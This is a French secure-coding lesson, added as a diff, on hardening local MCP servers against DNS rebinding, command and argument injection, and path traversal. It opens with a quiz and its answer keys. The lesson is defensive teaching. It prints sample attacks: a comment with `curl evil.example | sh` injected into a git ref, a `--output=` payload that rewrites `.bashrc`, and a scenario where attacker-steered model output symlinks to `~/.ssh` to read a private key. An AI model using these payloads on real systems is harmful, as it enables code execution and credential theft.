@@ -1,0 +1,187 @@
+export const questions = [
+  {
+    q: "Un serveur MCP local de Novafact écoute en HTTP sur 127.0.0.1:3920, sans authentification. Pourquoi une page web visitée par le développeur peut-elle quand même l'appeler ?",
+    options: [
+      "Parce que le navigateur ajoute le cookie de session du développeur à la requête",
+      "Parce qu'une adresse de boucle locale est toujours exposée par le pare-feu du poste",
+      "Parce que le DNS rebinding fait résoudre le domaine de la page vers 127.0.0.1",
+      "Parce que les requêtes POST en JSON ne déclenchent jamais de contrôle CORS",
+    ],
+    answer: 2,
+    explain: "Le DNS rebinding fait pointer le domaine de l'attaquant vers 127.0.0.1 après le chargement de la page : pour le navigateur, les requêtes restent de même origine, et le serveur local les reçoit. D'où l'obligation de valider `Origin` (et, dans le SDK, `Host`). Un POST en `application/json` déclenche bien un préflight CORS ; le rebinding le contourne précisément parce qu'il n'y a plus de requête cross-origin. Il n'y a pas de cookie dans l'affaire, et 127.0.0.1 n'est pas joignable depuis l'extérieur : c'est le navigateur qui sert de pont.",
+  },
+  {
+    q: "Un outil MCP vérifie qu'un chemin est autorisé avec `requested.startsWith('/srv/factures')`. Quelle requête passe le contrôle et sort du dossier ?",
+    options: [
+      "`/srv/factures/../../etc/passwd`, parce que `startsWith` ne normalise pas le chemin",
+      "`/srv/factures-archive/2024.pdf`, parce qu'un préfixe n'est pas un dossier parent",
+      "`/SRV/factures/f.pdf`, parce que la comparaison est sensible à la casse",
+      "`/srv/./factures/f.pdf`, parce que le segment `.` n'est pas résolu avant la comparaison",
+    ],
+    answer: 1,
+    explain: "C'est le mécanisme de CVE-2025-53110 dans le serveur Filesystem officiel : `/srv/factures-archive` commence par `/srv/factures` sans en être un sous-dossier. Le chemin avec `../` sort aussi du dossier, mais seulement si le code ne normalise pas d'abord ; la plupart des implémentations appellent `path.resolve` avant de comparer, et c'est le préfixe qui reste piégé. `/SRV/…` échoue la comparaison sous Linux, et `/srv/./factures` ne passe pas le contrôle littéral.",
+  },
+  {
+    q: "Le serveur git de Novafact appelle `execFile('git', ['diff', ref])` avec un `ref` choisi par le modèle. Il n'y a plus de shell. Que reste-t-il comme risque ?",
+    options: [
+      "L'injection d'argument : `--output=/chemin` est lu comme une option de git",
+      "L'injection de commande : `execFile` relance un shell dès qu'un argument contient `;`",
+      "Aucun, tant que `ref` est limité à 255 caractères et sans retour à la ligne",
+      "Le débordement de pile si `ref` contient des caractères non ASCII",
+    ],
+    answer: 0,
+    explain: "Sans shell, `;` ou `$(…)` ne font plus rien : `execFile` passe chaque argument tel quel au programme. Mais le programme lui-même interprète ses arguments, et une valeur qui commence par `-` devient une option. C'est CVE-2025-68144 dans mcp-server-git : `--output=/chemin/fichier` passé à `git diff` écrasait un fichier. Le correctif officiel refuse les arguments qui commencent par `-` et vérifie que la valeur est une référence valide avec `rev-parse`. Une limite de longueur ne change rien à une option de vingt caractères.",
+  },
+  {
+    q: "Après la CVE-2025-49596, quelles protections la version 0.14.1 de MCP Inspector a-t-elle ajoutées à son proxy local ?",
+    options: [
+      "Une liste blanche des commandes que le proxy accepte de lancer en stdio",
+      "Le chiffrement TLS de la connexion entre l'interface et le proxy local",
+      "Un bac à sable qui exécute chaque serveur lancé dans un conteneur jetable",
+      "Un jeton de session, la validation d'Origin et de Host, l'écoute sur localhost",
+    ],
+    answer: 3,
+    explain: "La cause racine était l'absence d'authentification entre l'interface et le proxy, joignable depuis une page web. Le correctif agit donc sur qui peut parler au proxy : jeton de session activé par défaut, validation des en-têtes Origin et Host contre le DNS rebinding, écoute limitée à localhost. Une liste blanche de commandes serait étrangère à l'outil, dont le rôle est justement de lancer le serveur que le développeur veut tester. TLS chiffrerait un échange qu'un attaquant initie lui-même, sans l'empêcher.",
+  },
+];
+
+<YouKnow>
+Injection de commande, traversée de chemin, DNS rebinding : un pentester les a tous exploités. Un serveur MCP local les réunit, avec une différence qui change tout : l'argument vient d'un modèle que n'importe quel texte peut orienter (leçon 3), et le processus tourne avec les droits du développeur, à côté de ses clés.
+</YouKnow>
+
+## Pourquoi « local » ne veut pas dire « à l'abri »
+
+Un serveur MCP local reçoit ses arguments du modèle. Le modèle les choisit d'après son contexte, que l'attaquant écrit par une issue, un ticket ou une facture importée. Pour la revue de code, un argument d'outil est donc une **entrée non fiable**, au même titre qu'un paramètre de requête HTTP. S'y ajoutent deux aggravations : le processus a les droits du développeur (clés SSH, jetons cloud, dépôts), et s'il écoute en HTTP, le navigateur du développeur peut servir de pont.
+
+Les CVE de 2025 couvrent les trois familles. On les reprend dans l'ordre où elles se présentent quand on écrit un serveur.
+
+## L'exposition réseau : Origin, Host, adresse d'écoute
+
+<Callout kind="case">
+**CVE-2025-49596** (CVSS 9,4, publiée le 13 juin 2025) touchait **MCP Inspector**, l'outil officiel de test de serveurs. Son proxy local, sur le port 6277, n'exigeait aucune authentification ; une requête vers `/sse?transportType=stdio&command=…` lui faisait lancer la commande de son choix. Oligo Security a montré qu'une simple page web y parvenait, par la faille de navigateur dite « 0.0.0.0-day », par DNS rebinding ou par CSRF. La version 0.14.1 a ajouté un jeton de session activé par défaut, la validation des en-têtes Origin et Host, et l'écoute limitée à localhost.
+</Callout>
+
+La spécification transpose ces trois parades au transport Streamable HTTP : valider `Origin` (403 s'il est présent et invalide), écouter sur 127.0.0.1, authentifier. Le SDK TypeScript v2 les applique par défaut avec `createMcpExpressApp`.
+
+<Diff file="tools/mcp-factures-local/src/server.ts" hlBefore="3,6" hlAfter="1,4,5,8,9">
+
+```ts
+import express from 'express';
+
+const app = express();                  // ni Host ni Origin vérifiés
+app.use(express.json());
+app.all('/mcp', (req, res) => void node(req, res, req.body));
+app.listen(3920);                       // écoute sur toutes les interfaces
+```
+
+```ts
+import { createMcpExpressApp } from '@modelcontextprotocol/express';
+
+// Host et Origin validés : un domaine rebindé vers 127.0.0.1 reçoit 403.
+const app = createMcpExpressApp();
+app.all('/mcp', requireLocalToken, (req, res) => void node(req, res, req.body));
+// Le jeton couvre ce qu'Origin ne voit pas : un autre processus du poste
+// n'envoie pas d'Origin, et la documentation du SDK précise qu'une requête sans Origin passe.
+app.listen(3920, '127.0.0.1');
+```
+
+</Diff>
+
+Le cas qui casse une protection fondée sur Origin seul : un script malveillant installé sur le poste (une dépendance npm compromise, par exemple) appelle `curl http://127.0.0.1:3920/mcp`. Pas de navigateur, donc pas d'Origin, donc aucun refus. D'où le jeton local, ou mieux : rester en **stdio**, que la spécification recommande pour un serveur destiné à tourner sur le poste, parce que seul le processus hôte peut alors l'appeler.
+
+## Les commandes : shell, puis arguments
+
+**CVE-2025-53967** (Framelink Figma MCP, corrigée en 0.6.3) : une entrée contenant des métacaractères shell finissait dans une commande `curl` construite par concaténation. Le correctif évident est de quitter le shell. Il ne suffit pas, comme l'a montré **CVE-2025-68144** dans le serveur git officiel : `git_diff` et `git_checkout` passaient la valeur fournie directement à git, et `--output=/chemin/fichier` était lu comme une option, d'où l'écrasement de fichiers.
+
+<Diff file="tools/mcp-git-novafact/src/tools/diff.ts" hlBefore="2" hlAfter="6,7,8,9,10">
+
+```ts
+export async function gitDiff(repo: string, ref: string) {
+  return exec(`git -C ${repo} diff ${ref}`);          // ref = "main; curl evil.example | sh"
+}
+```
+
+```ts
+import { execFile as execFileCb } from 'node:child_process';
+import { promisify } from 'node:util';
+const execFile = promisify(execFileCb);
+
+export async function gitDiff(repo: string, ref: string) {
+  // Sans shell, « ; » ne fait plus rien ; mais git lirait encore « --output=… » comme une option.
+  if (ref.startsWith('-')) throw new ToolError('référence invalide');
+  await execFile('git', ['-C', repo, 'rev-parse', '--verify', '--quiet', `${ref}^{commit}`]);
+  return execFile('git', ['-C', repo, 'diff', '--end-of-options', ref], { timeout: 10_000 });
+}
+```
+
+</Diff>
+
+Le payload qui casse le correctif à moitié fait (`execFile` sans contrôle de la valeur) : `ref = "--output=/home/dev/.bashrc"`. Pas de shell, pas de métacaractère, et pourtant un fichier réécrit. `--end-of-options`, que git comprend depuis la version 2.24, lui dit que ce qui suit n'est plus une option ; la vérification par `rev-parse` garantit en plus que la valeur désigne un commit. Le refus du `-` initial et la vérification de la référence reprennent le correctif officiel ; `--end-of-options` ajoute une seconde barrière.
+
+## Les chemins : préfixe, puis lien symbolique
+
+Le serveur Filesystem officiel a illustré les deux étapes classiques de l'échec, publiées le 1er juillet 2025 et corrigées en 2025.7.1 :
+
+- **CVE-2025-53110** : le contrôle vérifiait que le chemin **commençait par** le dossier autorisé. `/srv/factures-archive` commence par `/srv/factures`.
+- **CVE-2025-53109** : une fois le préfixe corrigé, un **lien symbolique** placé dans le dossier autorisé menait ailleurs, la vérification portant sur le chemin écrit et non sur sa cible.
+
+Le serveur git a eu son équivalent (**CVE-2025-68145**) : lancé avec `--repository`, il ne vérifiait pas que les chemins des appels suivants restaient dans ce dépôt.
+
+<Diff file="tools/mcp-factures-local/src/paths.ts" hlBefore="4" hlAfter="1,4,5,6,7,8,9">
+
+```ts
+const ROOT = '/srv/factures';
+
+export function resolveInvoicePath(requested: string) {
+  if (!path.resolve(requested).startsWith(ROOT)) throw new ToolError('hors périmètre');
+  return path.resolve(requested);
+}
+```
+
+```ts
+const ROOT = fs.realpathSync('/srv/factures');      // la racine elle-même peut être un lien
+
+export async function resolveInvoicePath(requested: string) {
+  // realpath suit les liens : on compare la cible réelle, pas le chemin écrit.
+  const real = await fs.promises.realpath(path.resolve(ROOT, requested));
+  const rel = path.relative(ROOT, real);
+  // « .. » en tête ou chemin absolu (autre volume) : on est sorti de la racine.
+  if (rel === '..' || rel.startsWith('..' + path.sep) || path.isAbsolute(rel)) throw new ToolError('hors périmètre');
+  return real;
+}
+```
+
+</Diff>
+
+Le payload qui casse un correctif limité à `path.resolve` : le modèle, sur consigne, crée `/srv/factures/export` comme lien vers `/home/dev/.ssh` avec un autre outil du même serveur, puis lit `export/id_ed25519`. Le chemin écrit est dans la racine, sa cible non. `realpath` résout la cible ; il reste une fenêtre entre la vérification et l'ouverture, que l'on ferme en n'exposant aucun outil qui crée des liens et en faisant tourner le serveur sous un compte qui n'a de droits que sur ce dossier.
+
+## La liste de revue d'un serveur local
+
+<Steps items={[
+  { title: "Transport", text: "stdio par défaut ; en HTTP, createMcpExpressApp, écoute sur 127.0.0.1 et jeton local, jamais 0.0.0.0." },
+  { title: "Arguments", text: "Schéma strict (zod) sur chaque outil : types, longueurs, énumérations. La spécification exige de valider toutes les entrées d'outil." },
+  { title: "Processus", text: "execFile ou spawn sans shell, refus des valeurs commençant par -, --end-of-options quand le programme le connaît, délai maximal." },
+  { title: "Fichiers", text: "realpath puis path.relative contre une racine elle-même résolue ; aucun outil qui crée des liens ; compte système limité au dossier." },
+  { title: "Moindre privilège", text: "Pas de secret inutile dans l'environnement ; un outil qui n'a pas d'usage (comme git_init, retiré du serveur git officiel) n'est pas exposé." },
+  { title: "Tests", text: "Chaque correctif arrive avec un test qui rejoue le payload (préfixe, lien, --output=) et un test qui prouve que l'usage normal passe encore." },
+]} />
+
+<Recap items={[
+  "Un argument d'outil est une entrée non fiable : le modèle le choisit d'après un contexte que l'attaquant écrit.",
+  "CVE-2025-49596 : un proxy local sans authentification, joignable depuis le navigateur. Origin, Host, 127.0.0.1 et jeton.",
+  "Origin ne protège que contre le navigateur ; stdio ou un jeton protège contre les autres processus.",
+  "Quitter le shell (CVE-2025-53967) ne suffit pas : un argument qui commence par - devient une option (CVE-2025-68144).",
+  "Préfixe naïf (CVE-2025-53110), puis lien symbolique (CVE-2025-53109) : realpath et path.relative, sur une racine résolue.",
+]} />
+
+<Sources items={[
+  { title: "GHSA-7f8r-222p-6f5g : MCP Inspector (CVE-2025-49596)", url: "https://github.com/advisories/GHSA-7f8r-222p-6f5g" },
+  { title: "Oligo Security : Critical RCE in Anthropic MCP Inspector", url: "https://www.oligo.security/blog/critical-rce-vulnerability-in-anthropic-mcp-inspector-cve-2025-49596" },
+  { title: "GHSA-hc55-p739-j48w : Filesystem, préfixe (CVE-2025-53110)", url: "https://github.com/advisories/GHSA-hc55-p739-j48w" },
+  { title: "GHSA-q66q-fx2p-7w4m : Filesystem, liens symboliques (CVE-2025-53109)", url: "https://github.com/advisories/GHSA-q66q-fx2p-7w4m" },
+  { title: "Cymulate : EscapeRoute", url: "https://cymulate.com/blog/cve-2025-53109-53110-escaperoute-anthropic/" },
+  { title: "NVD : CVE-2025-68144 (mcp-server-git, injection d'arguments)", url: "https://nvd.nist.gov/vuln/detail/CVE-2025-68144" },
+  { title: "NVD : CVE-2025-53967 (Framelink Figma MCP)", url: "https://nvd.nist.gov/vuln/detail/CVE-2025-53967" },
+  { title: "MCP SDK TypeScript : Serve with Express (DNS rebinding)", url: "https://github.com/modelcontextprotocol/typescript-sdk/blob/main/docs/serving/express.md" },
+  { title: "MCP 2026-07-28 : Security Best Practices (Local MCP Server Compromise)", url: "https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices" },
+]} />
